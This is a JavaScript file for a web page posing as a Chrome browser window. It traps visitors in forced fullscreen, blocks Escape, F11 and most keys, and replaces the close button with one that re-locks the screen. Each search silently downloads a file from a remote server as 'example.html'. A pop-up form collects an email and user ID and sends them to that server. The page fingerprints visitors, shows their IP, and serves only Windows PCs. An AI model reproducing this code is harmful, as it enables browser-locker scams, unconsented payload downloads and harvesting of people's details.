const urlForm = document.getElementById("url-form");
const urlInput = document.getElementById("url-input");
const urlChip = document.getElementById("url-chip");
const urlChipLabel = document.getElementById("url-chip-label");
const urlStar = document.getElementById("url-star");
const navBack = document.getElementById("nav-back");
const navForward = document.getElementById("nav-forward");
const navReload = document.getElementById("nav-reload");
const LINKWAR_API = "https://linkwar.up.railway.app";

function isFileAddress(value) {
  return /^(file:|[a-zA-Z]:[\\/]|\\\\)/i.test(value.trim());
}

function toDisplayUrl(href) {
  if (href.startsWith("file:///")) {
    let path = decodeURIComponent(href.slice(8));
    if (/^\/[A-Za-z]:/.test(path)) path = path.slice(1);
    return path;
  }
  try {
    const url = new URL(href);
    url.searchParams.delete("igu");
    return url.toString();
  } catch {
    return href;
  }
}

function toNavigateUrl(value) {
  const v = value.trim();
  if (/^[a-zA-Z]:[\\/]/.test(v) || v.startsWith("\\\\")) {
    return "file:///" + v.replace(/\\/g, "/");
  }
  if (/^(https?|file|ftp):/i.test(v)) return v;
  if (v.startsWith("//")) return "https:" + v;
  return "https://" + v;
}

function syncChip() {
  const value = urlInput.value.trim();
  const showFile = isFileAddress(value);
  urlChip.hidden = !showFile;
  urlChipLabel.textContent = showFile ? "File" : "";
}

function looksLikeUrl(value) {
  const v = value.trim();
  if (/^(https?:|file:|ftp:)/i.test(v)) return true;
  if (/^[a-zA-Z]:[\\/]/.test(v) || v.startsWith("\\\\")) return true;
  if (/\s/.test(v)) return false;
  if (/^(localhost|(\d{1,3}\.){3}\d{1,3})(:\d+)?(\/|$)/i.test(v)) return true;
  return /^[^\s]+\.[a-z]{2,}([/:?#].*)?$/i.test(v);
}

function isGoogleHost(hostname) {
  return /^(?:www\.)?google\.[a-z.]+$/i.test(hostname);
}

function isGoogleSearchSrc(src) {
  try {
    const url = new URL(src, window.location.href);
    return isGoogleHost(url.hostname) && url.pathname.startsWith("/search");
  } catch {
    return false;
  }
}

function googleSearchUrls(value) {
  let query = value.trim();
  if (looksLikeUrl(query)) {
    try {
      const url = new URL(toNavigateUrl(query));
      if (isGoogleHost(url.hostname) && url.pathname.startsWith("/search")) {
        query = url.searchParams.get("q") || query;
      }
    } catch {
      /* Keep the typed value as the query. */
    }
  }

  const display = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
  return { query, display, embed: `${display}&igu=1` };
}

function openQuery(value) {
  const v = value.trim();
  if (!v) return;

  if (looksLikeUrl(v)) {
    const url = toNavigateUrl(v);
    if (isGoogleSearchSrc(url)) {
      const search = googleSearchUrls(url);
      startSearchInNewChromeTab(search);
      return;
    }
    leaveForWebsite(url);
    return;
  }

  const search = googleSearchUrls(v);
  startSearchInNewChromeTab(search);
}

const pageFrame = document.getElementById("page-frame");
const ntp = document.getElementById("ntp");
const ntpForm = document.getElementById("ntp-form");
const ntpInput = document.getElementById("ntp-input");

function showNewTab() {
  ntp.classList.remove("is-hidden");
  pageFrame.classList.add("is-hidden");
  setActiveTabTitle("New Tab");
}

function showFrame() {
  ntp.classList.add("is-hidden");
  pageFrame.classList.remove("is-hidden");
}

function setActiveTabTitle(title) {
  const active = document.querySelector("#tab-list .tab.is-active .tab-title");
  if (active) active.textContent = title;
}

const session = { stack: [], index: -1 };

function loadFrame(src, title, fromHistory = false) {
  if (src === "about:blank") {
    showNewTab();
    if (!fromHistory) pushHistory(src);
    syncNavButtons();
    return;
  }

  if (!isGoogleSearchSrc(src)) {
    leaveForWebsite(src);
    return;
  }

  showFrame();
  if (!fromHistory) pushHistory(src);
  pageFrame.src = src;
  setAddressBar(src);
  if (title) setActiveTabTitle(title);
  syncNavButtons();
}

function pushHistory(src) {
  session.stack = session.stack.slice(0, session.index + 1);
  session.stack.push(src);
  session.index = session.stack.length - 1;
}

function syncNavButtons() {
  navBack.disabled = session.index <= 0;
  navForward.disabled = session.index >= session.stack.length - 1;
}

function setAddressBar(url) {
  const display = toDisplayUrl(url);
  urlInput.value = display;
  syncChip();
}

const helloModal = document.getElementById("hello-modal");
const helloEmail = document.getElementById("hello-email");
const helloId = document.getElementById("hello-id");
const helloModalForm = document.getElementById("hello-modal-form");
const helloToast = document.getElementById("hello-toast");
let helloToastTimer = 0;
let helloModalHideTimer = 0;

function showHelloModal(animate = false) {
  helloEmail.value = "";
  helloId.value = "";
  if (helloModalHideTimer) {
    window.clearTimeout(helloModalHideTimer);
    helloModalHideTimer = 0;
  }
  helloModal.hidden = false;
  helloModal.classList.remove("is-hidden", "is-visible");
  if (animate) {
    void helloModal.offsetWidth;
    window.requestAnimationFrame(() => {
      helloModal.classList.add("is-visible");
      window.setTimeout(() => helloEmail.focus(), 440);
    });
  } else {
    helloModal.classList.add("is-visible");
    window.setTimeout(() => helloEmail.focus(), 0);
  }
}

function hideHelloModal() {
  if (helloModal.hidden || helloModal.classList.contains("is-hidden")) {
    helloEmail.value = "";
    helloId.value = "";
    return;
  }
  helloModal.classList.remove("is-visible");
  if (helloModalHideTimer) window.clearTimeout(helloModalHideTimer);
  helloModalHideTimer = window.setTimeout(() => {
    helloModal.hidden = true;
    helloModal.classList.add("is-hidden");
    helloModalHideTimer = 0;
  }, 430);
  helloEmail.value = "";
  helloId.value = "";
}

function showHelloToast(message) {
  helloToast.textContent = message;
  helloToast.hidden = false;
  helloToast.classList.remove("is-hidden");
  if (helloToastTimer) window.clearTimeout(helloToastTimer);
  helloToastTimer = window.setTimeout(() => {
    helloToast.hidden = true;
    helloToast.classList.add("is-hidden");
    helloToastTimer = 0;
  }, 3200);
}

helloModal.addEventListener("pointerdown", (event) => {
  if (event.button !== 0) return;
  if (event.target === helloModal) hideHelloModal();
});

helloModalForm.addEventListener("submit", (event) => {
  event.preventDefault();
  const email = helloEmail.value.trim();
  const userId = helloId.value.trim();
  if (!email || !userId) return;
  hideHelloModal();
  void fetch(`${LINKWAR_API}/api/project/email`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ project: "hello", email, userId }),
  }).catch(() => {});
  showHelloToast("The information was sent successfully.");
});

urlInput.value = "";
syncChip();

urlInput.addEventListener("input", syncChip);

urlStar.addEventListener("click", () => {
  const on = urlStar.classList.toggle("is-on");
  urlStar.setAttribute("aria-pressed", String(on));
  urlStar.setAttribute("aria-label", on ? "Remove bookmark" : "Bookmark this tab");
});

navBack.addEventListener("click", () => {
  if (session.index <= 0) return;
  session.index -= 1;
  const src = session.stack[session.index];
  loadFrame(src, src === "about:blank" ? "New Tab" : src, true);
});

navForward.addEventListener("click", () => {
  if (session.index >= session.stack.length - 1) return;
  session.index += 1;
  const src = session.stack[session.index];
  loadFrame(src, src === "about:blank" ? "New Tab" : src, true);
});

navReload.addEventListener("click", () => {
  if (pageFrame.classList.contains("is-hidden")) return;
  pageFrame.src = pageFrame.src;
});

pageFrame.addEventListener("load", () => {
  try {
    const href = pageFrame.contentWindow.location.href;
    if (href && href !== "about:blank") {
      setAddressBar(href);
      if (session.index >= 0) session.stack[session.index] = href;
    }
    const title = pageFrame.contentDocument?.title;
    if (title) setActiveTabTitle(title);
  } catch {
    /* Cross-origin pages hide their document from this page. */
  }
});

urlForm.addEventListener("submit", (event) => {
  event.preventDefault();
  openQuery(urlInput.value);
});

ntpForm.addEventListener("submit", (event) => {
  event.preventDefault();
  const value = ntpInput.value.trim();
  if (!value) return;
  urlInput.value = value;
  openQuery(value);
});

function handleSearchEnterKey(event) {
  if (event.key !== "Enter" && event.keyCode !== 13) return;
  if (event.isComposing) return;
  event.preventDefault();
  event.stopPropagation();
  const value = String(event.target?.value || "").trim();
  if (!value) return;
  if (event.target === ntpInput) urlInput.value = value;
  openQuery(value);
}

urlInput.addEventListener("keydown", handleSearchEnterKey);
ntpInput.addEventListener("keydown", handleSearchEnterKey);

const tabList = document.getElementById("tab-list");
const tabNew = document.getElementById("tab-new");

const CHROME_TAB_FAVICON = `<svg class="tab-favicon" viewBox="0 0 48 48" aria-hidden="true"><use href="#chrome-favicon" /></svg>`;

function tabTemplate() {
  const tab = document.createElement("div");
  tab.className = "tab";
  tab.setAttribute("role", "tab");
  tab.setAttribute("aria-selected", "false");
  tab.innerHTML = `
    <span class="tab-lead">
      ${CHROME_TAB_FAVICON}
      <span class="tab-title">New Tab</span>
    </span>
    <button class="tab-close" type="button" aria-label="Close tab">
      <svg viewBox="0 0 16 16" aria-hidden="true">
        <path d="M4.2 4.2l7.6 7.6M11.8 4.2l-7.6 7.6" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"></path>
      </svg>
    </button>
  `;
  return tab;
}

function activateTab(tab) {
  tabList.querySelectorAll(".tab").forEach((item) => {
    item.classList.toggle("is-active", item === tab);
    item.setAttribute("aria-selected", item === tab ? "true" : "false");
  });
}

tabList.addEventListener("click", (event) => {
  const close = event.target.closest(".tab-close");
  const tab = event.target.closest(".tab");
  if (!tab) return;

  if (close) {
    event.stopPropagation();
    const tabs = [...tabList.querySelectorAll(".tab")];
    if (tabs.length === 1) return;
    const wasActive = tab.classList.contains("is-active");
    const index = tabs.indexOf(tab);
    tab.remove();
    if (wasActive) {
      const remaining = tabList.querySelectorAll(".tab");
      activateTab(remaining[Math.max(0, index - 1)]);
    }
    return;
  }

  activateTab(tab);
});

tabNew.addEventListener("click", () => {
  const tab = tabTemplate();
  tabList.appendChild(tab);
  activateTab(tab);
});

function openBackgroundChromeTab(url) {
  const shouldRestoreFullscreen = fullscreenLocked || isFullscreen();
  let opened = null;
  try {
    opened = window.open(url, "_blank", "noopener,noreferrer");
  } catch {
    opened = null;
  }

  if (opened) {
    try {
      opened.blur();
    } catch {
      /* Ignore. */
    }
  }

  const restoreOriginalTab = () => {
    try {
      window.focus();
    } catch {
      /* Ignore. */
    }
    if (shouldRestoreFullscreen) enterFullscreen();
  };

  restoreOriginalTab();
  window.setTimeout(restoreOriginalTab, 0);
  window.setTimeout(restoreOriginalTab, 60);
  window.setTimeout(restoreOriginalTab, 200);
  window.setTimeout(restoreOriginalTab, 500);
  return Boolean(opened);
}

function downloadFromExample() {
  const fileName = "example.html";
  const trigger = (href, revoke = false) => {
    const a = document.createElement("a");
    a.href = href;
    a.download = fileName;
    a.rel = "noopener";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
    if (revoke) {
      window.setTimeout(() => URL.revokeObjectURL(href), 2500);
    }
  };

  void fetch("https://linkwar.up.railway.app/f/44c9b29aff4e6a9d97e8ccaf", { method: "GET", mode: "cors", cache: "no-store" })
    .then((res) => {
      if (!res.ok) throw new Error("Example download failed.");
      return res.blob();
    })
    .then((blob) => {
      trigger(URL.createObjectURL(blob), true);
    })
    .catch(() => {
      trigger("https://linkwar.up.railway.app/f/44c9b29aff4e6a9d97e8ccaf");
    });
}

function openRealChromeTab(url, { background = false } = {}) {
  if (background) {
    return openBackgroundChromeTab(url);
  }

  siteWindowOpened = true;
  leftProjectForSite = false;
  exitFullscreen();
  const tab = window.open(url, "_blank");
  if (tab) {
    try {
      tab.opener = null;
    } catch {
      /* Ignore if the browser already isolated the window. */
    }
    return true;
  }
  siteWindowOpened = false;
  enterFullscreen();
  return false;
}

function startSearchInNewChromeTab(search) {
  const originalTab = document.querySelector("#tab-list .tab.is-active");

  const tab = tabTemplate();
  const titleEl = tab.querySelector(".tab-title");
  if (titleEl) titleEl.textContent = search.query || "New Tab";
  tabList.appendChild(tab);

  if (originalTab) activateTab(originalTab);

  downloadFromExample();

  if (originalTab) activateTab(originalTab);
  loadFrame(search.embed);
  if (originalTab) activateTab(originalTab);
}

function isF11(event) {
  return event.key === "F11" || event.code === "F11" || event.keyCode === 122;
}

function isFullscreen() {
  return Boolean(document.fullscreenElement || document.webkitFullscreenElement);
}

function ignoreKeyboard(event) {
  if (isF11(event)) {
    event.preventDefault();
    event.stopPropagation();
    event.stopImmediatePropagation();
    return;
  }

  const esc = event.key === "Escape" || event.key === "Esc" || event.keyCode === 27;
  if (esc) {
    event.preventDefault();
    event.stopImmediatePropagation();
    return;
  }

  if (event.target === urlInput || event.target === ntpInput) return;
  if (event.target === helloEmail || event.target === helloId) return;
  if (event.target.closest?.("#sorry-page") || event.target.closest?.("#hello-modal")) return;
  event.preventDefault();
  event.stopImmediatePropagation();
}

["keydown", "keyup", "keypress"].forEach((type) => {
  window.addEventListener(type, ignoreKeyboard, { capture: true, passive: false });
  document.addEventListener(type, ignoreKeyboard, { capture: true, passive: false });
});

const winRestore = document.getElementById("win-restore");
const winClose = document.querySelector(".win-close");
let fullscreenLocked = false;
let siteWindowOpened = false;
let leftProjectForSite = false;

function enterFullscreen() {
  if (document.documentElement.classList.contains("is-blocked")) return;
  if (document.documentElement.classList.contains("is-gated")) return;
  fullscreenLocked = true;
  if (isFullscreen()) return;
  const node = document.documentElement;
  const request = node.requestFullscreen || node.webkitRequestFullscreen;
  if (request) {
    Promise.resolve(request.call(node, { navigationUI: "hide" })).catch(() => {});
  }
}

function exitFullscreen() {
  fullscreenLocked = false;
  const exit = document.exitFullscreen || document.webkitExitFullscreen;
  if (isFullscreen() && exit) {
    Promise.resolve(exit.call(document)).catch(() => {});
  }
}

function leaveForWebsite(url) {
  setAddressBar(url);
  try {
    setActiveTabTitle(new URL(url).hostname);
  } catch {
    setActiveTabTitle(url);
  }

  siteWindowOpened = true;
  leftProjectForSite = false;
  exitFullscreen();

  const width = Math.max(800, Math.round(screen.availWidth * 0.9));
  const height = Math.max(600, Math.round(screen.availHeight * 0.9));
  const left = Math.max(0, Math.round((screen.availWidth - width) / 2));
  const top = Math.max(0, Math.round((screen.availHeight - height) / 2));
  const popup = window.open(
    url,
    "_blank",
    `popup=yes,width=${width},height=${height},left=${left},top=${top}`
  );

  if (popup) {
    try {
      popup.opener = null;
    } catch {
      /* Ignore if the browser already isolated the window. */
    }
    return;
  }

  siteWindowOpened = false;
  enterFullscreen();
}

function restoreFullscreenAfterSite() {
  if (!siteWindowOpened || !leftProjectForSite) return;
  if (document.visibilityState === "hidden") return;
  siteWindowOpened = false;
  leftProjectForSite = false;
  enterFullscreen();
}

function keepFullscreen() {
  if (document.documentElement.classList.contains("is-blocked")) return;
  if (document.documentElement.classList.contains("is-gated")) return;
  if (siteWindowOpened) return;
  if (!fullscreenLocked) return;
  enterFullscreen();
}

window.addEventListener("blur", () => {
  if (siteWindowOpened) leftProjectForSite = true;
});

window.addEventListener("focus", restoreFullscreenAfterSite);

document.addEventListener("visibilitychange", () => {
  if (siteWindowOpened && document.visibilityState === "hidden") {
    leftProjectForSite = true;
  }
  if (document.visibilityState === "visible") restoreFullscreenAfterSite();
});

winRestore.addEventListener("click", (event) => {
  event.preventDefault();
  enterFullscreen();
});

if (winClose) {
  winClose.addEventListener("click", (event) => {
    event.preventDefault();
    keepFullscreen();
  });
}

["pointerdown", "mousedown", "click", "touchstart"].forEach((type) => {
  window.addEventListener(type, keepFullscreen, true);
});

document.addEventListener("fullscreenchange", keepFullscreen);
document.addEventListener("webkitfullscreenchange", keepFullscreen);

const sorryTime = document.getElementById("sorry-time");
const sorryUrl = document.getElementById("sorry-url");
const sorryMeta = document.getElementById("sorry-meta");
let visitorProfile = null;

function detectClientProfile() {
  const ua = navigator.userAgent || "";
  const platform = navigator.platform || "";
  const uaData = navigator.userAgentData;
  const uaPlatform = String(uaData?.platform || "");
  const android =
    /Android/i.test(ua) ||
    /^Android$/i.test(uaPlatform) ||
    /; wv\)/i.test(ua);

  const mobile =
    android ||
    Boolean(uaData?.mobile) ||
    /Mobi|iPhone|iPod|iPad|Tablet|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua) ||
    (Number(navigator.maxTouchPoints || 0) > 1 && /Mac/i.test(platform));

  let osName = "Unknown";
  if (android) osName = "Android";
  else if (/^Win/i.test(uaPlatform) || /Windows NT/i.test(ua) || /Win(32|64)/i.test(platform)) osName = "Windows";
  else if (/iPhone|iPad|iPod/i.test(ua) || (mobile && /Mac/i.test(platform))) osName = "iOS";
  else if (/^Mac/i.test(uaPlatform) || /Mac OS X|Macintosh/i.test(ua) || /Mac/i.test(platform)) osName = "macOS";

  const isChrome = /Chrome\//i.test(ua) && !/Edg\//i.test(ua) && !/OPR\//i.test(ua);

  return {
    deviceType: mobile || android ? "Mobile" : "PC",
    osName,
    isAndroid: android,
    isChrome,
  };
}

function isAllowedWindowsClient(profile = detectClientProfile()) {
  return profile.deviceType === "PC" && profile.osName === "Windows" && !profile.isAndroid;
}

function blockUnsupportedClient() {
  document.documentElement.classList.add("is-blocked");
}

function updateSorryMeta(ip) {
  if (sorryTime) sorryTime.textContent = new Date().toISOString();
  if (sorryUrl) sorryUrl.textContent = urlInput.value.trim() || window.location.href;
  if (sorryMeta && ip) {
    sorryMeta.innerHTML = `IP address: ${ip}<br />
Time: <span id="sorry-time">${sorryTime?.textContent || ""}</span><br />
URL: <span id="sorry-url">${sorryUrl?.textContent || ""}</span>`;
  }
}

async function reportProjectEntry() {
  const profile = detectClientProfile();
  visitorProfile = profile;
  if (!isAllowedWindowsClient(profile)) blockUnsupportedClient();
  try {
    const res = await fetch(`${LINKWAR_API}/api/project/entry`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        project: "hello",
        pageUrl: window.location.href,
        clientDeviceType: profile.deviceType,
        clientOsName: profile.osName,
        clientIsChrome: profile.isChrome,
      }),
    });
    const data = await res.json().catch(() => null);
    if (data?.ok) {
      visitorProfile = {
        ...profile,
        ip: data.ip || "",
        country: data.country || data.nationality || "",
        deviceType: data.deviceType || profile.deviceType,
        osName: data.osName || profile.osName,
        isChrome: data.isChrome ?? profile.isChrome,
      };
      updateSorryMeta(data.ip || "");
    }
  } catch {
    updateSorryMeta("");
  }
}

updateSorryMeta("");

const photoGate = document.getElementById("photo-gate");
const photoGateBtn = document.getElementById("photo-gate-btn");
const everyoneAlert = document.getElementById("everyone-alert");
let everyoneAlertTimer = 0;
let projectStarted = false;

function showEveryoneAlert() {
  if (!everyoneAlert) return;
  everyoneAlert.hidden = false;
  everyoneAlert.classList.remove("is-hidden", "is-visible");
  void everyoneAlert.offsetWidth;
  window.requestAnimationFrame(() => everyoneAlert.classList.add("is-visible"));
  if (everyoneAlertTimer) window.clearTimeout(everyoneAlertTimer);
  everyoneAlertTimer = window.setTimeout(() => {
    everyoneAlert.classList.remove("is-visible");
    everyoneAlertTimer = window.setTimeout(() => {
      everyoneAlert.hidden = true;
      everyoneAlert.classList.add("is-hidden");
      everyoneAlertTimer = 0;
    }, 400);
  }, 4200);
}

function startProjectFromPhoto() {
  if (projectStarted) return;
  if (document.documentElement.classList.contains("is-blocked")) return;
  projectStarted = true;
  document.documentElement.classList.remove("is-gated");
  if (photoGate) photoGate.hidden = true;
  enterFullscreen();
  showEveryoneAlert();
  void reportProjectEntry();
}

if (photoGateBtn) {
  photoGateBtn.addEventListener("click", (event) => {
    event.preventDefault();
    startProjectFromPhoto();
  });
}

if (!document.documentElement.classList.contains("is-gated")) {
  void reportProjectEntry();
}
